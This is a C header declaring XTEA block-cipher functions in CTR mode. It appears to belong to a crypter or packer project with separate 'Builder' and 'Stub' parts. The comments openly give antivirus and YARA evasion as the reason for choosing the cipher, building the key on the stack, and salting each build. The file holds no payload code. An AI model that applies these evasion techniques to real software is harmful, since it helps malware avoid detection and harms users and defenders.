/*
 * ==========================================================================
 *  Xtea.h — XTEA Block Cipher in CTR Mode — declarations
 * ==========================================================================
 *
 *  WHAT IS XTEA?
 *  -------------
 *  XTEA (eXtended TEA) is a lightweight 64-bit block cipher designed in 1997
 *  by Needham and Wheeler as a fix to weaknesses found in the original TEA.
 *  It uses a 128-bit key and runs 32 full rounds (64 half-rounds total).
 *
 *  Why XTEA over RC4 / ChaCha20?
 *  - RC4: key scheduling algorithm is trivially recognizable by static analysis.
 *  - ChaCha20: "expand 32-byte k" magic constants are YARA-signatured by many AV.
 *  - XTEA: virtually absent from public malware corpora → no AV signatures.
 *    The entire round function fits in ~10 lines of C with no lookup tables.
 *
 *  HOW XTEA WORKS (block encrypt):
 *  --------------------------------
 *  Input:  two 32-bit words  v0, v1  (together = 64-bit plaintext block)
 *  Key:    four 32-bit words k0..k3  (together = 128-bit key)
 *  Delta:  0x9E3779B9  (floor((phi-1) * 2^32), phi = golden ratio)
 *
 *  For i = 0 .. 31:
 *    v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum       + key[sum & 3])
 *    sum += delta
 *    v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum       + key[(sum>>11) & 3])
 *
 *  Each round mixes v0 and v1 through:
 *    - Left and right shifts (non-linear diffusion)
 *    - XOR (bit mixing)
 *    - Modular addition (introduces carry propagation across bits)
 *    - Key-dependent addition (the key gates each round differently)
 *
 *  WHY CTR MODE?
 *  -------------
 *  Counter (CTR) mode turns XTEA (a block cipher) into a stream cipher:
 *    1. Maintain a 64-bit counter, starting at 0.
 *    2. For each 8-byte chunk of data: encrypt the counter → get 8 keystream bytes.
 *    3. XOR the keystream with the plaintext.
 *    4. Increment the counter.
 *
 *  Benefits of CTR over raw block cipher:
 *    - No padding required (handles arbitrary data length naturally).
 *    - Encryption == Decryption (same Xtea_Crypt() call for both).
 *    - Parallelizable (each block independent) — not needed here but clean design.
 *
 *  KEY DERIVATION — STACK CONSTRUCTION:
 *  -------------------------------------
 *  See Xtea_DeriveKey() in Xtea.c for details. The 128-bit key is built from
 *  a chain of arithmetic operations rather than stored as a literal constant.
 *  This prevents static scanners from finding a contiguous 16-byte key blob.
 *
 * ==========================================================================
 */

#pragma once

#ifndef XTEA_H
#define XTEA_H

#include <Windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ============================================================
 *  Xtea_DeriveKey
 *
 *  Builds the 128-bit XTEA key via stack construction — no
 *  flat 16-byte literal in .data. See Xtea.c for full explanation.
 *
 *  Per-build uniqueness: the caller supplies a 16-byte salt generated
 *  by CryptGenRandom in Builder and stored plaintext in .rsrc.
 *  Stub reads the salt from .rsrc before calling this function.
 *  The final key = derived_base XOR salt, so every build produces
 *  a different keystream even though the stack-construction formula
 *  is identical in both Builder and Stub.
 *
 *  Parameters:
 *    key[4]   [out]  — receives four 32-bit key words (128 bits total)
 *    salt[4]  [in]   — per-build random salt from .rsrc metadata block
 * ============================================================ */
void Xtea_DeriveKey(DWORD key[4], const DWORD salt[4]);

/* ============================================================
 *  Xtea_Crypt
 *
 *  Encrypts or decrypts arbitrary-length data in-place using
 *  XTEA in CTR (Counter) mode. The operation is symmetric —
 *  calling Xtea_Crypt twice with the same key restores the original.
 *
 *  Parameters:
 *    pData    — pointer to data buffer (modified in-place)
 *    dataLen  — length of data in bytes (any size, no padding needed)
 *    key[4]   — 128-bit key from Xtea_DeriveKey()
 * ============================================================ */
void Xtea_Crypt(PBYTE pData, SIZE_T dataLen, const DWORD key[4]);

#ifdef __cplusplus
}
#endif

#endif /* XTEA_H */
